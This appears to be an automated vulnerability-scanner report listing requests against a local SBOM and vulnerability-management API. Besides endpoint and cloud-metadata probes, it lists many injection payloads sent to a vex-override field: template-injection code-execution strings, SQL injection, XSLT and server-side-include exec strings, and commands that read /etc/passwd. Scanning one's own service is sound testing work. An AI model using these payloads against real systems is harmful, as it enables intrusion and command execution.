* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content%3Fsource=repair_draft&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content%3Fsource=http%253A%252F%252Fwww.google.com%252F&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content-lines
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content-lines`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content-lines%3Fsource=repair_draft&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content-lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content-lines%3Fsource=http%253A%252F%252Fwww.google.com%252F&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content-lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content-lines/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content-lines/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/7897257394898132977
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/7897257394898132977`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/chunk
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/chunk`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/chunk%3Fsource=repair_draft&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/chunk (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/chunk%3Fsource=http%253A%252F%252Fwww.google.com%252F&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/chunk (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/chunk/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/chunk/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/lines
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/lines`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/lines%3Fsource=repair_draft&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/lines%3Fsource=http%253A%252F%252Fwww.google.com%252F&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/content/lines/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/content/lines/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/download-original
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/download-original`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/download-original/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/download-original/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/download-repair-draft
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/download-repair-draft`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/download-repair-draft/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/download-repair-draft/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/history
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/history`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/history/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/history/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/repair
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/repair`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/repair/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/repair/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/repair/2665519726309597406
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/repair/2665519726309597406`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/search
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/search`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/search%3Fq=q&source=repair_draft&limit=100
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/search (limit,q,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/search%3Fq=q&source=http%253A%252F%252Fwww.google.com%252F&limit=100
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/search (limit,q,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/search/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/search/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/computeMetadata/v1/
  * Node Name: `http://host.docker.internal:8000/computeMetadata/v1/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/dashboard
  * Node Name: `http://host.docker.internal:8000/dashboard`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/dashboard/
  * Node Name: `http://host.docker.internal:8000/dashboard/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/dashboard/2614896362108261941
  * Node Name: `http://host.docker.internal:8000/dashboard/2614896362108261941`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/dashboard/forecast%3Fhistory_days=http%253A%252F%252Fwww.google.com%252F&horizon_days=14
  * Node Name: `http://host.docker.internal:8000/dashboard/forecast (history_days,horizon_days)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/dashboard/recent-sboms%3Flimit=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/dashboard/recent-sboms (limit)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/dashboard/risk-matrix%3Flimit=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/dashboard/risk-matrix (limit)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/dashboard/trend%3Fdays=30&granularity=&application_ids=
  * Node Name: `http://host.docker.internal:8000/dashboard/trend (application_ids,days,granularity)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/dashboard/vulnerability-age%3Fperiod=http%253A%252F%252Fwww.google.com%252F&date_from=&date_to=
  * Node Name: `http://host.docker.internal:8000/dashboard/vulnerability-age (date_from,date_to,period)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/latest/meta-data/
  * Node Name: `http://host.docker.internal:8000/latest/meta-data/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/metadata/instance
  * Node Name: `http://host.docker.internal:8000/metadata/instance`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/metadata/v1
  * Node Name: `http://host.docker.internal:8000/metadata/v1`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/opc/v1/instance/
  * Node Name: `http://host.docker.internal:8000/opc/v1/instance/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/opc/v2/instance/
  * Node Name: `http://host.docker.internal:8000/opc/v2/instance/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/openstack/latest/meta_data.json
  * Node Name: `http://host.docker.internal:8000/openstack/latest/meta_data.json`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/lifecycle-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/lifecycle-override ()({lifecycle_status,eos_date,eol_date,eof_date,is_deprecated,deprecated,unsupported,maintenance_status,latest_version,latest_supported_version,recommended_version,recommendation,lifecycle_recommendation,evidence_url,lifecycle_source_url,reason,note,evidence:{},updated_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/lifecycle-override/
  * Node Name: `http://host.docker.internal:8000/api/components/10/lifecycle-override/ ()({lifecycle_status,eos_date,eol_date,eof_date,is_deprecated,deprecated,unsupported,maintenance_status,latest_version,latest_supported_version,recommended_version,recommendation,lifecycle_recommendation,evidence_url,lifecycle_source_url,reason,note,evidence:{},updated_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("#set($engine=\"\")\n#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"sleep 15\"))\n#set($null=$proc.waitFor())\n${null}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("#{%x(sleep 15)}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("${__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("'(")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("+response.write({0}*{1})+")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("5;URL='https://6178435829869361747.owasp.org'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("5;URL='https://6178435829869361747.owasp.org/?John Doe'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("6178435829869361747.owasp.org")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()(";")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()(";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<!--")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<!--#EXEC cmd=\"dir \\\"-->")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<!--#EXEC cmd=\"ls /\"-->")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 15\") }")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<%=%x(sleep 15)%>")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<xsl:value-of select=\"document('http://host.docker.internal:22')\"/>")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<xsl:value-of select=\"php:function('exec','erroneous_command 2>&amp;1')\"/>")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/>")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("<xsl:variable name=\"rtobject\" select=\"runtime:getRuntime()\"/>\n<xsl:variable name=\"process\" select=\"runtime:exec($rtobject,'erroneous_command')\"/>\n<xsl:variable name=\"waiting\" select=\"process:waitFor($process)\"/>\n<xsl:value-of select=\"$process\"/>")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe AND 1=1 -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe AND 1=2 -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe OR 1=1 -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe UNION ALL select NULL -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe&cat /etc/passwd&")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe&type %SYSTEMROOT%\\win.ini")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe' AND '1'='1' -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe' AND '1'='2' -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe' OR '1'='1' -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe' UNION ALL select NULL -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe'&cat /etc/passwd&'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe'&type %SYSTEMROOT%\\win.ini&'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe'(")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe') UNION ALL select NULL -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe';cat /etc/passwd;'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe';get-help")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe'|type %SYSTEMROOT%\\win.ini")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe) UNION ALL select NULL -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe;")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe;cat /etc/passwd;")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe;get-help #")`
